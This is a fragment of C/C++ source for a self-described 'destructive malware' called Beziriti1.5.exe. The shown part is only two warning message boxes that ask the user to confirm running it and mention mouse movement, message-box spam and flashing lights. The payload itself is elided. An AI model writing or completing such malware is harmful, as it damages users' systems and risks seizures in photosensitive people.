// Beziriti1.5.exe - a destructive malware made by VietNamLover!
...
int main() {
    if (MessageBoxW(NULL, L"This is a destructive malware, run?", L"Beziriti1.5.exe by VietNamLover", 
    ...
    if (MessageBoxW(NULL, L"Are you sure? It will still move your mouse, spam MessageBoxes, contains flashing lights and it not for epilepsy! ", 
                    L"Beziriti1.5.exe - lAsT wARniNg", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
